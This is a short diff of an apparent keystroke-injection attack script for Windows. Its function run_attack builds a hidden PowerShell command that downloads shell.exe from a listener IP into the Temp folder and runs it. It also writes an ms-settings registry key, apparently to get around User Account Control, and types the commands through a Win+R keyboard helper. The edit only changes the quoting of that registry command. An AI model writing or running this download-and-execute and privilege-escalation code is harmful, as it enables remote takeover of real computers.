@@ -276,7 +276,7 @@ def run_attack():
     revshell_cmd = f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadFile('http://{LISTENER_IP}/shell.exe', 'C:\\Windows\\Temp\\s.exe'); C:\\Windows\\Temp\\s.exe"
     
     # Command to add the registry key
-    reg_cmd = f"reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \\"{revshell_cmd}\\" /f"
+    reg_cmd = f"reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \'{revshell_cmd}\' /f"
 
     try:
         hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.r) # Win+R
